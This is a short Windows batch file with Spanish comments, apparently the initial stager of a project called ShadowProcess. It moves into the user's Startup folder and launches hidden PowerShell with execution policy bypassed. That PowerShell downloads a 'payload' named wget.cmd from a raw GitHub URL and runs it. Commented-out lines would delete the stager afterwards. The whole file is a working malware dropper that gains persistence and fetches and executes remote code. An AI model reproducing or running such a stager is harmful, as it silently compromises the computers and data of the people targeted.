@echo off
@REM iniciador

@REM Variables
@REM Locacion inicial
set "INITIALPATH=%cd%"
@REM definr directorio inicio de programas.
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"


@REM Dirigirse al direcrotio del inicio de windows.
cd  %STARTUP%

@REM Ejecutar payloads al inicio.
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"

@REM Corriendo el payload
powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd

@REM Borramos el iniciador
@REM cd %INITIALPATH%
@REM DEL "initial.cmd"